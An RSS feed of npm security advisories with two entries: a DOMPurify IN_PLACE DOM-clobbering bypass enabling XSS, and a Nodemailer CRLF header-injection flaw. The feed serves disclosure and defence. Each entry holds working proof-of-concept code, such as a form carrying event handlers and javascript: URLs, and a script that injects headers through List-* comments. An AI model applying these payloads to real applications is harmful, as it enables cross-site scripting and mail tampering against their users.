<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-06-15T19:54:09.495Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMPurify: IN_PLACE mode preserves attributes of a clobbered root element, allowing XSS via attacker-controlled root DOM]]></title>
        <id>https://github.com/advisories/GHSA-r47g-fvhr-h676</id>
        <link href="https://github.com/advisories/GHSA-r47g-fvhr-h676"/>
        <updated>2026-06-15T19:53:05.000Z</updated>
        <content type="html"><![CDATA[<h1 id="in_place-mode-preserves-attributes-of-a-clobbered-root-element-allowing-xss-via-attacker-controlled-root-dom">IN_PLACE mode preserves attributes of a clobbered root element, allowing XSS via attacker-controlled root DOM</h1>
<p><strong>CWE</strong>: CWE-79 (XSS — Improper Neutralization of Input During Web Page Generation) via CWE-693 (Protection Mechanism Failure — silent no-op when <code>_forceRemove</code> is called on a parent-less node)</p>
<h2 id="summary">Summary</h2>
<p>When <code>DOMPurify.sanitize(root, { IN_PLACE: true })</code> is called and <code>root</code> is a <code>&lt;form&gt;</code> whose own attributes carry an event handler (<code>onmouseover</code>, <code>onfocus</code>, <code>onclick</code>, etc.), a single descendant element with a <code>name=</code> attribute matching any of the property names <code>_isClobbered</code> checks (<code>nodeName</code>, <code>setAttribute</code>, <code>namespaceURI</code>, <code>insertBefore</code>, <code>hasChildNodes</code>, <code>childNodes</code>) is sufficient to bypass attribute sanitization on the root. <code>_forceRemove</code> silently no-ops because the root has no parent; the iterator drives on to <code>_sanitizeAttributes</code>, which early-returns on clobbered nodes — and the event handler attribute is never inspected. The sanitized return is the same root, with the handler live.</p>
<p>This affects current <code>main</code> at <code>89da34e</code> (the just-landed DOM-clobbering hardening fix at <code>89da34e</code> addressed <code>_sanitizeAttachedShadowRoots</code> walk traversal, <strong>not</strong> the main <code>_sanitizeElements</code> / <code>_sanitizeAttributes</code> pipeline against the iterator-root node).</p>
<h2 id="affected">Affected</h2>
<ul>
<li>DOMPurify ≤ 3.4.5, including <code>main</code> at <code>89da34e03ec17868e561f87f3747a9371b61a9e7</code></li>
<li>Any caller that does <code>DOMPurify.sanitize(node, { IN_PLACE: true })</code> where <code>node</code> is built from untrusted HTML (e.g., parsed via <code>createElement('template').innerHTML = dirty</code> then <code>template.content.firstElementChild</code> handed in)</li>
</ul>
<p>Not affected:</p>
<ul>
<li>String-input <code>DOMPurify.sanitize(dirtyString)</code> — the library builds the DOM itself inside <code>_initDocument</code>, the root is the cleanly-created document body, and clobber-named children of the body cannot shadow <code>body</code> named properties (HTMLBodyElement does not carry <code>[LegacyOverrideBuiltIns]</code>)</li>
<li>IN_PLACE where the root is not an HTMLFormElement</li>
<li>IN_PLACE where the attacker cannot place a clobber-named child inside the root</li>
</ul>
<h2 id="vulnerability-details">Vulnerability details</h2>
<h3 id="code-paths">Code paths</h3>
<p><strong>[A]</strong> — <code>_forceRemove</code> at <code>src/purify.ts:930-939</code>:</p>
<pre><code class="language-ts">const _forceRemove = function (node: Node): void {
  arrayPush(DOMPurify.removed, { element: node });
  try {
    // eslint-disable-next-line unicorn/prefer-dom-node-remove
    getParentNode(node).removeChild(node);   // [A1] throws when getParentNode returns null
  } catch (_) {
    remove(node);                             // [A2] WebIDL Node.remove() — spec-defined no-op
  }                                           //      when the node has no parent
};
</code></pre>
<p>When the iterator-root has no parent (the standard IN_PLACE case where the caller hands in a detached node), <code>getParentNode(node)</code> returns <code>null</code>, <code>null.removeChild(node)</code> throws, the catch falls to <code>remove(node)</code> — which per WebIDL is <code>Element.prototype.remove.call(node)</code>, and per spec <strong>does nothing if the node has no parent</strong>. Nothing about <code>_forceRemove</code>'s contract acknowledges this — the function appears to its callers as "the node is gone now," but the node is still in place.</p>
<p><strong>[B]</strong> — <code>_sanitizeAttributes</code> at <code>src/purify.ts:1490-1492</code>:</p>
<pre><code class="language-ts">const _sanitizeAttributes = function (currentNode: Element): void {
  _executeHooks(hooks.beforeSanitizeAttributes, currentNode, null);

  const { attributes } = currentNode;

  /* Check if we have attributes; if not we might have a text node */
  if (!attributes || _isClobbered(currentNode)) {
    return;                                   // [B] silently skips ALL attribute checks
  }                                           //     for clobbered nodes
  ...
};
</code></pre>
<p>The skip at <code>[B]</code> is deliberate — the intent is to avoid touching nodes the library has already decided to discard. The invariant the comment implies is <em>"if <code>_isClobbered</code>, then <code>_sanitizeElements</code> already removed this node, so we will never reach <code>_sanitizeAttributes</code> on it."</em> That invariant holds for every non-root node (their <code>_forceRemove</code> succeeds in detaching them), but fails for the iterator root in IN_PLACE mode.</p>
<p><strong>The mismatch</strong> is between [A] and [B]: [A] assumes "removal" means the node will not be observed again, and [B] assumes any clobbered node it sees has already been removed. Neither holds for the iterator root. A correct guard would either make <code>_forceRemove</code> fail loudly on parent-less nodes (so the caller can bail out of IN_PLACE entirely) or have <code>_sanitizeAttributes</code> strip attributes from clobbered roots before returning.</p>
<h3 id="iterator-call-site">Iterator call site</h3>
<p><code>src/purify.ts:1850-1864</code> ignores the boolean return value of <code>_sanitizeElements</code>:</p>
<pre><code class="language-ts">const nodeIterator = _createNodeIterator(IN_PLACE ? dirty : body);

while ((currentNode = nodeIterator.nextNode())) {
  _sanitizeElements(currentNode);       // returns `true` if killed — IGNORED
  _sanitizeAttributes(currentNode);     // runs unconditionally; relies on [B]'s skip
  ...
}
</code></pre>
<p>If the return value were checked and <code>_sanitizeAttributes</code> skipped when the node was "killed," the bug would not exist as a discrete issue — but currently <code>_sanitizeAttributes</code> is the only line of defense for a node that <code>_sanitizeElements</code> could not actually detach.</p>
<h3 id="why-the-clobber-works">Why the clobber works</h3>
<p>In Chromium/WebKit/Firefox, <code>HTMLFormElement</code> carries the WebIDL <code>[LegacyOverrideBuiltIns]</code> extended attribute on its named-property getter. A descendant element with <code>name="X"</code> (or <code>id="X"</code>, for radio-button-like names) shadows the matching property on the form, including properties inherited from <code>Element</code>, <code>Node</code>, and <code>EventTarget</code> prototypes. This is the same primitive the just-landed <code>89da34e</code> fix addresses for shadow-root traversal, but <code>_isClobbered</code>'s typeof checks (and the bypass-by-detection-failure path here) are independent of that fix.</p>
<p>Verified clobber targets (each name= value independently triggers <code>_isClobbered</code>):</p>
<table>
<thead>
<tr>
<th><code>name=</code> value</th>
<th>property <code>_isClobbered</code> checks</th>
<th>typeof on clobbered form</th>
</tr>
</thead>
<tbody><tr>
<td><code>nodeName</code></td>
<td><code>typeof element.nodeName !== 'string'</code></td>
<td>object (an <code>&lt;INPUT&gt;</code>)</td>
</tr>
<tr>
<td><code>setAttribute</code></td>
<td><code>typeof element.setAttribute !== 'function'</code></td>
<td>object (not callable) — <em>but</em> <code>&lt;embed&gt;</code>/<code>&lt;applet&gt;</code>/<code>&lt;iframe&gt;</code> ARE callable; see "Note on callable elements" below</td>
</tr>
<tr>
<td><code>namespaceURI</code></td>
<td><code>typeof element.namespaceURI !== 'string'</code></td>
<td>object</td>
</tr>
<tr>
<td><code>insertBefore</code></td>
<td><code>typeof element.insertBefore !== 'function'</code></td>
<td>object</td>
</tr>
<tr>
<td><code>hasChildNodes</code></td>
<td><code>typeof element.hasChildNodes !== 'function'</code></td>
<td>object</td>
</tr>
<tr>
<td><code>childNodes</code></td>
<td><code>!(element.childNodes &amp;&amp; typeof element.childNodes.length === 'number')</code></td>
<td>object — <code>&lt;INPUT&gt;</code> has no <code>.length</code></td>
</tr>
<tr>
<td><code>attributes</code></td>
<td><code>!(element.attributes instanceof NamedNodeMap)</code></td>
<td>object (an <code>&lt;INPUT&gt;</code> is not a NamedNodeMap)</td>
</tr>
<tr>
<td><code>textContent</code></td>
<td><code>typeof element.textContent !== 'string'</code></td>
<td>object</td>
</tr>
<tr>
<td><code>removeChild</code></td>
<td><code>typeof element.removeChild !== 'function'</code></td>
<td>object (non-callable)</td>
</tr>
<tr>
<td><code>removeAttribute</code></td>
<td><code>typeof element.removeAttribute !== 'function'</code></td>
<td>object (non-callable)</td>
</tr>
</tbody></table>
<p>Any single one of the ten property names in <code>_isClobbered</code>'s checklist is sufficient as the bypass trigger.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<h3 id="1-minimal--runnable-in-a-single-browser-context">(1) Minimal — runnable in a single browser context</h3>
<pre><code class="language-html">&lt;!doctype html&gt;
&lt;html&gt;&lt;body&gt;
&lt;script src="dist/purify.js"&gt;&lt;/script&gt;
&lt;script&gt;
  const root = document.createElement('form');
  root.setAttribute('onmouseover', 'window.__rooted = 1');
  const clobber = document.createElement('input');
  clobber.setAttribute('name', 'nodeName');
  root.appendChild(clobber);

  // typeof root.nodeName === 'object' (an &lt;INPUT&gt; element), not 'string'.
  // _isClobbered fires; _forceRemove(root) becomes a no-op because root.parentNode === null.
  DOMPurify.sanitize(root, { IN_PLACE: true });

  console.log('output:', root.outerHTML);
  // &lt;form onmouseover="window.__rooted = 1"&gt;&lt;input name="nodeName"&gt;&lt;/form&gt;
  //  ^^^^^^^^^^^^^^^^^^ event handler survived ^^^^^^^^^^^^^^^^^^

  document.body.appendChild(root);
  root.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));
  console.log('handler fired:', window.__rooted === 1);  // true
&lt;/script&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<h3 id="2-end-to-end--playwright-against-main-head">(2) End-to-end — Playwright against <code>main</code> HEAD</h3>
<pre><code class="language-js">const { chromium } = require('playwright');
const path = require('path');

(async () =&gt; {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  await page.setContent('&lt;!doctype html&gt;&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;');
  await page.addScriptTag({ path: path.resolve('dist/purify.js') });

  const result = await page.evaluate(() =&gt; {
    const root = document.createElement('form');
    root.setAttribute('onmouseover', 'window.__rooted = 1');
    const clobber = document.createElement('input');
    clobber.setAttribute('name', 'nodeName');
    root.appendChild(clobber);

    DOMPurify.sanitize(root, { IN_PLACE: true });

    document.body.appendChild(root);
    window.__rooted = 0;
    root.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));

    return {
      version: DOMPurify.version,
      output: root.outerHTML,
      handlerFired: window.__rooted === 1,
    };
  });
  console.log(result);
  await browser.close();
})();
</code></pre>
<p>Observed (Chromium 148.0.7778.96, DOMPurify 3.4.5, HEAD <code>89da34e</code>):</p>
<pre><code>{
  version: '3.4.5',
  output: '&lt;form onmouseover="window.__rooted = 1"&gt;&lt;input name="nodeName"&gt;&lt;/form&gt;',
  handlerFired: true
}
</code></pre>
<h3 id="3-variant-matrix--six-distinct-clobber-target-properties">(3) Variant matrix — six distinct clobber-target properties</h3>
<p>Every property name in <code>_isClobbered</code>'s typeof checklist works as the bypass trigger:</p>
<pre><code>[BYPASS] name="nodeName"      → &lt;form onmouseover="…"&gt;&lt;input&gt;&lt;/form&gt;
[BYPASS] name="setAttribute"  → &lt;form onmouseover="…"&gt;&lt;input&gt;&lt;/form&gt;
[BYPASS] name="namespaceURI"  → &lt;form onmouseover="…"&gt;&lt;input&gt;&lt;/form&gt;
[BYPASS] name="insertBefore"  → &lt;form onmouseover="…"&gt;&lt;input&gt;&lt;/form&gt;
[BYPASS] name="hasChildNodes" → &lt;form onmouseover="…"&gt;&lt;input&gt;&lt;/form&gt;
[BYPASS] name="childNodes"    → &lt;form onmouseover="…"&gt;&lt;input&gt;&lt;/form&gt;
</code></pre>
<p>This makes the fix less of a one-line patch — every property <code>_isClobbered</code> checks for the typeof-spoofing pattern needs to be considered.</p>
<h2 id="impact">Impact</h2>
<h3 id="direct">Direct</h3>
<p>Two distinct impact paths from the same root-attribute-survival primitive:</p>
<p><strong>(a) XSS via event-handler attribute on the surviving root.</strong> Any consumer that uses <code>DOMPurify.sanitize(node, { IN_PLACE: true })</code> where <code>node</code> originated from untrusted HTML and is re-inserted into the live document is vulnerable to XSS. The typical pattern is:</p>
<pre><code class="language-js">const t = document.createElement('template');
t.innerHTML = untrustedHtml;
DOMPurify.sanitize(t.content.firstElementChild, { IN_PLACE: true });
container.appendChild(t.content.firstElementChild);
</code></pre>
<p>If <code>untrustedHtml</code> is <code>&lt;form onmouseover=…&gt;&lt;input name=nodeName&gt;…&lt;/form&gt;</code>, the resulting node has the <code>onmouseover</code> attribute intact when re-inserted into the live document.</p>
<p><strong>(b) Every attribute-level defense is bypassed on the surviving root, not just event handlers.</strong> The <code>_sanitizeAttributes</code> early-return at <code>:1490</code> skips the entire attribute walk for clobbered nodes, so the root preserves attributes that the attribute walk would otherwise sanitize. Verified additional attributes that survive:</p>
<ul>
<li><strong><code>action="javascript:..."</code> and <code>formaction="javascript:..."</code></strong> — URI validation at <code>:1413</code> never runs. A user click on a submit button inside the sanitized form navigates to the <code>javascript:</code> URL, executing the handler. Adds a click-triggered XSS path on top of the mouseover/focus event-handler attributes already documented.</li>
<li><strong><code>id="&lt;colliding-name&gt;"</code></strong> — the DOM-clobbering guard at <code>:1352-1359</code> (<code>SANITIZE_DOM &amp;&amp; (lcName === 'id' || lcName === 'name') &amp;&amp; (value in document || value in formElement)</code>) lives inside <code>_sanitizeAttributes</code> and is skipped. An attacker can therefore land <code>id="cookie"</code>, <code>id="body"</code>, <code>id="head"</code>, <code>id="firstChild"</code>, etc. on the surviving form root and use it as a DOM-clobbering primitive against any consumer code that does <code>document.cookie</code>, <code>document.body</code>, etc.</li>
<li><strong><code>target="_top"</code></strong>, <strong><code>autofocus</code></strong>, <strong><code>formenctype</code></strong>, <strong><code>formmethod</code></strong> — all survive untouched.</li>
<li><strong>Custom event handlers DOMPurify wouldn't have explicit list entries for</strong> (e.g., newly-spec'd <code>oncontentvisibilityautostatechange</code>) survive on the clobbered root via the same skip; the per-name allow-list at <code>:1361-1364</code> never runs.</li>
</ul>
<p>Verified — full attribute set survives on a single payload (PoC):</p>
<pre><code class="language-js">const root = document.createElement('form');
root.setAttribute('action', 'javascript:alert(1)');
root.setAttribute('target', '_top');
root.setAttribute('onclick', 'alert(2)');
root.setAttribute('onmouseover', 'alert(3)');
root.setAttribute('autofocus', '');
root.setAttribute('formaction', 'javascript:alert(4)');
root.setAttribute('id', 'cookie');           // DOM-clobbering primitive
root.innerHTML += '&lt;input name="nodeName"&gt;';
DOMPurify.sanitize(root, { IN_PLACE: true });
console.log(root.outerHTML);
// &lt;form action="javascript:alert(1)" target="_top" onclick="alert(2)"
//       onmouseover="alert(3)" autofocus="" formaction="javascript:alert(4)"
//       id="cookie"&gt;&lt;input&gt;&lt;/form&gt;
</code></pre>
<p><strong>(c) Defense-in-depth re-sanitization on the same node is INEFFECTIVE — the clobber is sticky.</strong> Chromium's <code>HTMLFormElement</code> named-property cache appears to retain the named child reference even after the child's <code>name</code> attribute is removed during the sanitization pass. Empirically verified — after the first sanitize pass, the input's <code>name="nodeName"</code> attribute is correctly stripped (the output shows <code>&lt;input&gt;</code> with no attributes), yet <code>typeof form.nodeName === 'object'</code> is still true and the input element is still returned. Calling <code>DOMPurify.sanitize(sameNode, { IN_PLACE: true })</code> a second time hits the same <code>_isClobbered</code> → <code>_forceRemove</code> → <code>_sanitizeAttributes</code> early-return path. The only effective recovery is serialize-then-reparse:</p>
<pre><code class="language-js">const root = parseAttackerHtml();                                     // form with input name="nodeName" child
DOMPurify.sanitize(root, { IN_PLACE: true });                         // bypass: attrs survive
DOMPurify.sanitize(root, { IN_PLACE: true });                         // STILL bypassed: attrs survive
const recovered = (() =&gt; {
  const t = document.createElement('template');
  t.innerHTML = root.outerHTML;                                       // forces a fresh parse
  const r = t.content.firstElementChild;
  DOMPurify.sanitize(r, { IN_PLACE: true });
  return r;
})();
// recovered.outerHTML === '&lt;form&gt;&lt;input&gt;&lt;/form&gt;'  ← finally clean
</code></pre>
<p>A "belt-and-suspenders" caller that re-runs DOMPurify on its own output is therefore not protected against this primitive on Chromium; the obvious mitigation pattern fails silently. Any user-side workaround needs to route through a string round-trip.</p>
<p><strong>(d) SAFE_FOR_TEMPLATES bypass for the root's attributes.</strong> When the caller sets <code>SAFE_FOR_TEMPLATES: true</code> to defend a downstream template engine (Vue, Angular, Liquid, Handlebars, …) from receiving <code>{{…}}</code> / <code>&lt;%…%&gt;</code> / <code>${…}</code> syntax through DOMPurify's output, attribute-level template-syntax stripping runs in the same <code>_sanitizeAttributes</code> pass that early-returns on clobbered roots (<code>:1572-1576</code>). The root's attributes therefore retain raw template syntax that the downstream engine then evaluates.</p>
<p>Verified — same PoC structure, with <code>SAFE_FOR_TEMPLATES: true</code>:</p>
<pre><code class="language-js">const root = document.createElement('form');
root.setAttribute('title', '{{evil}}');
root.setAttribute('onmouseover', 'window.__x=1');
const c = document.createElement('input');
c.setAttribute('name', 'nodeName');
root.appendChild(c);

DOMPurify.sanitize(root, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });

console.log(root.outerHTML);
// &lt;form title="{{evil}}" onmouseover="window.__x=1"&gt;&lt;input&gt;&lt;/form&gt;
//        ^^^^^^^^^^^^^^^^ template syntax survives
</code></pre>
<p>This compounds with (a): a single payload exfiltrates via XSS (immediate) and via SSTI to downstream renderers (delayed).</p>
<p>(Text-node content inside the form is still scrubbed correctly — <code>_scrubTemplateExpressions</code> at <code>:1868-1870</code> walks text/comment/CDATA/PI nodes independently and reaches them via the iterator. Only attribute values on the clobbered root escape.)</p>
<h3 id="indirect--second-order">Indirect / second-order</h3>
<ul>
<li><strong>DOM-based template systems / editors</strong> that wrap DOMPurify with an IN_PLACE call for parsed user content (CMSes, comment widgets, WYSIWYG editors persisting structured HTML).</li>
<li><strong>Email/HTML preview libraries</strong> that pre-parse received HTML before sanitization for performance reasons.</li>
<li><strong>Frameworks that hand DOMPurify a node tree</strong> rather than a string — including, indirectly, any code path that does <code>el.innerHTML = …; DOMPurify.sanitize(el, { IN_PLACE: true })</code>. The outer <code>el</code> is fine (it's not the form), but if the <em>first child</em> of <code>el</code> is taken as the sanitization root in a different code path, the bypass triggers.</li>
</ul>
<h3 id="why-current-main-is-also-vulnerable">Why current <code>main</code> is also vulnerable</h3>
<p>Commit <code>89da34e</code> ("fix: fixed a possible DOM clobbering with IN_PLACE and shadow DOM") hardens <code>_sanitizeAttachedShadowRoots</code> via three new cached prototype getters (<code>getShadowRoot</code>, <code>getNodeName</code>, <code>getNodeType</code>) and an <code>_isClobbered</code> extension that checks <code>element.childNodes.length</code>. The fix is correct for its scope — shadow-root traversal — but does not change <code>_forceRemove</code>'s parent-less-node behavior or <code>_sanitizeAttributes</code>'s clobber-skip early-return. The bypass demonstrated here is in the IN_PLACE main pipeline, not the shadow-root walk, and the verification PoC above runs against HEAD <code>89da34e</code> and still succeeds.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Two minimal-risk options:</p>
<ol>
<li><p><strong>Make <code>_forceRemove</code> honest about failure</strong>: return whether the node was actually detached, and have the iterator call site honor that.</p>
<pre><code class="language-ts">const _forceRemove = function (node: Node): boolean {
  arrayPush(DOMPurify.removed, { element: node });
  try {
    getParentNode(node).removeChild(node);
    return true;
  } catch (_) {
    try { remove(node); } catch (_) {}
    return node.parentNode === null &amp;&amp; /* but still attached to itself */ false;
  }
};
</code></pre>
<p>Then at <code>:1855</code>, if <code>_sanitizeElements</code> returns true AND IN_PLACE, force-strip all attributes of the root before returning the dirty tree. (This is what the user expects — sanitization either succeeds or refuses to return a "sanitized" handle to an unsanitized tree.)</p>
</li>
<li><p><strong>Strip attributes inside <code>_sanitizeAttributes</code> for clobbered roots</strong>: when <code>_isClobbered(currentNode)</code> is true at <code>:1490</code>, instead of early-returning, iterate <code>currentNode.attributes</code> (using the cached <code>getAttributes</code> if you add one) and remove each via <code>removeAttribute</code>. This preserves the existing semantics for non-root clobbered nodes (their attributes-of-a-removed-node will be GC'd anyway) and removes the attack surface for root.</p>
</li>
<li><p><strong>Refuse IN_PLACE on parent-less clobbered roots</strong>: at the top of the iterator, check that the root either has a parent OR is not <code>_isClobbered</code>. If both fail, throw. This is the most defensive option but breaks any existing caller that hands in a clobbered detached root expecting "sanitized = empty/safe."</p>
</li>
</ol>
<h3 id="note-on-callable-elements">Note on callable elements</h3>
<p>In Chromium and WebKit, <code>HTMLEmbedElement</code>, <code>HTMLAppletElement</code>, <code>HTMLIFrameElement</code>, and <code>HTMLScriptElement</code> have <code>typeof === 'function'</code> because they expose plugin/iframe <code>[[Call]]</code> traps at the WebIDL level. A <code>name="setAttribute"</code> <em>child</em> of one of these tags spoofs the <code>setAttribute typeof === 'function'</code> check — but only matters for the <em>attribute re-set</em> path at <code>:1619</code>, not the bypass demonstrated here (which uses <code>nodeName</code> and friends). The callable-element vector is worth checking separately as a potential <code>SAFE_FOR_TEMPLATES</code>-bypass primitive; the present report does not depend on it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-r47g-fvhr-h676">https://github.com/cure53/DOMPurify/security/advisories/GHSA-r47g-fvhr-h676</a></li>
<li><a href="https://github.com/advisories/GHSA-r47g-fvhr-h676">https://github.com/advisories/GHSA-r47g-fvhr-h676</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r47g-fvhr-h676</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-15T19:53:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nodemailer] Nodemailer: CRLF injection in Nodemailer List-* header comments allows arbitrary message header injection]]></title>
        <id>https://github.com/advisories/GHSA-268h-hp4c-crq3</id>
        <link href="https://github.com/advisories/GHSA-268h-hp4c-crq3"/>
        <updated>2026-06-15T17:36:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Nodemailer constructs <code>List-*</code> headers from the caller-provided <code>list</code> message option using internally prepared header values. The <code>list.*.comment</code> field is inserted into those prepared values without removing CR (<code>\r</code>) or LF (<code>\n</code>) characters. Because prepared headers bypass the normal header-value sanitizer and are passed to <code>mimeFuncs.foldLines()</code>, a CRLF sequence in a list comment is emitted as an actual header boundary in the generated RFC822 message.</p>
<p>An application that lets a lower-privileged or unauthenticated user influence <code>list.help.comment</code>, <code>list.unsubscribe.comment</code>, <code>list.subscribe.comment</code>, <code>list.post.comment</code>, <code>list.owner.comment</code>, <code>list.archive.comment</code>, or <code>list.id.comment</code> can therefore be made to generate messages containing attacker-chosen additional headers.</p>
<h3 id="details">Details</h3>
<p>Source-to-sink evidence:</p>
<ul>
<li><code>lib/mailer/mail-message.js:241-249</code> calls <code>_getListHeaders(this.data.list)</code> and adds each returned value with <code>this.message.addHeader(listHeader.key, value)</code>.</li>
<li><code>lib/mailer/mail-message.js:253-296</code> builds each list header value as <code>{ prepared: true, foldLines: true, value: ... }</code>.</li>
<li>For <code>List-ID</code>, <code>lib/mailer/mail-message.js:272-279</code> copies <code>value.comment</code> into the generated header value. If <code>mimeFuncs.isPlainText(comment)</code> returns true, it wraps the comment in quotes rather than encoding or CRLF-normalizing it.</li>
<li>For the other <code>List-*</code> headers, <code>lib/mailer/mail-message.js:283-288</code> copies <code>value.comment</code> into <code>(&lt;comment&gt;)</code>. If <code>mimeFuncs.isPlainText(comment)</code> returns true, the value is not encoded or CRLF-normalized.</li>
<li><code>lib/mime-node/index.js:323-351</code> accepts the prepared header object.</li>
<li><code>lib/mime-node/index.js:533-540</code> trusts <code>options.prepared</code>; when <code>foldLines</code> is set, it pushes <code>mimeFuncs.foldLines(key + ': ' + value)</code> directly into the header block.</li>
<li>The normal header-value sanitizer path is bypassed because the value is marked prepared. By contrast, ordinary unprepared header values are normalized in the regular header-building path.</li>
<li><code>lib/mailer/mail-message.js:299-308</code> removes whitespace and angle brackets from <code>list.*.url</code>, so the confirmed injection source is the <code>comment</code> field, not the URL field.</li>
</ul>
<p>Default/common exposure evidence:</p>
<ul>
<li><code>lib/nodemailer.js:21-60</code> exposes the public <code>createTransport(...).sendMail(...)</code> flow used by the package.</li>
<li><code>examples/full.js:106-123</code> documents <code>list.unsubscribe.comment</code> and <code>list.id.comment</code> as normal message options.</li>
<li>The behavior is in shipped runtime code and does not require test-only code, non-default build steps, or undocumented internals.</li>
</ul>
<p>False-positive screening and negative controls:</p>
<ul>
<li>SMTP command construction was separately reviewed. Envelope sender/recipients reject CRLF before SMTP commands, EHLO names strip CRLF, SIZE is numeric, and DSN fields are encoded; no SMTP command-injection variant was confirmed.</li>
<li>Ordinary <code>subject</code> header input containing CRLF was normalized to a single <code>Subject:</code> header and did not create <code>X-Injected</code> in the local control case.</li>
<li>Address display names and MIME filename/content-type parameters were reviewed by a focused MIME/header audit and were encoded or CRLF-normalized in local checks.</li>
<li><code>prepared: true</code> custom headers are an explicit low-level escape hatch, but this issue is different because Nodemailer itself creates prepared headers from the documented <code>list.*.comment</code> option.</li>
</ul>
<p>Variant analysis:</p>
<p>Local testing confirmed the same root cause for comments in <code>List-Help</code>, <code>List-Unsubscribe</code>, <code>List-Subscribe</code>, <code>List-Post</code>, <code>List-Owner</code>, <code>List-Archive</code>, and <code>List-ID</code>. These should be fixed together by rejecting or normalizing CR/LF in list comments before prepared header generation, or by avoiding the prepared-header bypass for caller-controlled list values.</p>
<p>Affected version evidence and uncertainty:</p>
<ul>
<li>Confirmed vulnerable: <code>nodemailer</code> 8.0.8 at commit <code>15138a84c543c20aa399218534cdbbfa2ea1ce55</code>.</li>
<li>Git history shows <code>_getListHeaders</code> present in historical commits including <code>22fcff8</code> (<code>v4.3.0</code>) and related list-header work in <code>9b4f90a</code> (<code>v3.1.8</code>), but older versions were not dynamically tested during this audit.</li>
<li>Affected range is therefore recorded as unknown beyond the confirmed current version.</li>
<li>No patched version was identified in this checkout.</li>
</ul>
<p>Severity rationale:</p>
<ul>
<li>AV: The vulnerable library path is reached through application-level message submission in typical networked applications that use Nodemailer.</li>
<li>AC: A single CRLF sequence in a documented message option triggers the issue.</li>
<li>PR: Conservative assumption that the attacker is a lower-privileged user of an application that exposes list metadata fields. Some applications could expose this to unauthenticated users, but that was not assumed.</li>
<li>UI: No maintainer or victim interaction is needed after the application accepts the message object.</li>
<li>S: The impact remains in the application/mail-generation security scope.</li>
<li>C/I: Injected headers can affect message metadata, mail-client/filter interpretation, and downstream mail-pipeline decisions. No SMTP envelope recipient injection or code execution was demonstrated.</li>
<li>A: No availability impact was demonstrated.</li>
</ul>
<p>Final self-review:</p>
<ul>
<li>Reproduction evidence was generated locally from this checkout with a safe in-memory <code>streamTransport</code> PoC and a negative <code>Subject</code> control case.</li>
<li>The PoC is non-destructive and does not send network traffic outside the process.</li>
<li>The observed output contains an actual CRLF-delimited injected header line.</li>
<li>Reachability, sanitizer bypass, package exposure, variants, and non-exploitable sibling paths were checked as described above.</li>
<li>The affected range is not overclaimed; only the current tested version is confirmed vulnerable.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>From a clean checkout of <code>nodemailer</code> at commit <code>15138a84c543c20aa399218534cdbbfa2ea1ce55</code>, run:</p>
<pre><code class="language-bash">node &lt;&lt;'NODE'
'use strict';
const nodemailer = require('./');
const headersEnd = raw =&gt; raw.slice(0, raw.indexOf('\r\n\r\n'));
const hasStandaloneInjected = raw =&gt; /\r\nX-Injected: yes\)/.test(raw) || /\r\nX-Injected: yes\r\n/.test(raw);
(async () =&gt; {
  const transport = nodemailer.createTransport({ streamTransport: true, buffer: true });
  const positive = await transport.sendMail({
    from: 'sender@example.test',
    to: 'recipient@example.test',
    subject: 'control',
    list: { unsubscribe: { url: 'https://example.test/u', comment: 'ok\r\nX-Injected: yes' } },
    text: 'body'
  });
  const positiveRaw = positive.message.toString('utf8');
  console.log('POSITIVE_HAS_INJECTED=' + hasStandaloneInjected(positiveRaw));
  console.log('POSITIVE_LIST_LINE=' + JSON.stringify(headersEnd(positiveRaw).split('\r\n').filter(line =&gt; /^List-Unsubscribe:|^X-Injected:/.test(line)).join('\n')));

  const control = await transport.sendMail({
    from: 'sender@example.test',
    to: 'recipient@example.test',
    subject: 'safe\r\nX-Injected: no',
    text: 'body'
  });
  const controlRaw = control.message.toString('utf8');
  console.log('CONTROL_HAS_INJECTED=' + /\r\nX-Injected: no\r\n/.test(controlRaw));
  console.log('CONTROL_SUBJECT=' + JSON.stringify(headersEnd(controlRaw).split('\r\n').filter(line =&gt; /^Subject:|^X-Injected:/.test(line)).join('\n')));

  const variantKeys = ['help', 'unsubscribe', 'subscribe', 'post', 'owner', 'archive', 'id'];
  const result = [];
  for (const key of variantKeys) {
    const info = await transport.sendMail({
      from: 'sender@example.test',
      to: 'recipient@example.test',
      subject: 'variant ' + key,
      list: Object.assign({}, { [key]: { url: key === 'id' ? 'example.test' : 'https://example.test/' + key, comment: 'c\r\nX-Variant-' + key + ': yes' } }),
      text: 'body'
    });
    result.push(key + '=' + new RegExp('\\r\\nX-Variant-' + key + ': yes').test(info.message.toString('utf8')));
  }
  console.log('VARIANTS=' + result.join(','));
})().catch(err =&gt; { console.error(err &amp;&amp; err.stack || err); process.exit(1); });
NODE
</code></pre>
<p>Observed output in this environment:</p>
<pre><code class="language-text">POSITIVE_HAS_INJECTED=true
POSITIVE_LIST_LINE="List-Unsubscribe: &lt;https://example.test/u&gt; (ok\nX-Injected: yes)"
CONTROL_HAS_INJECTED=false
CONTROL_SUBJECT="Subject: safe X-Injected: no"
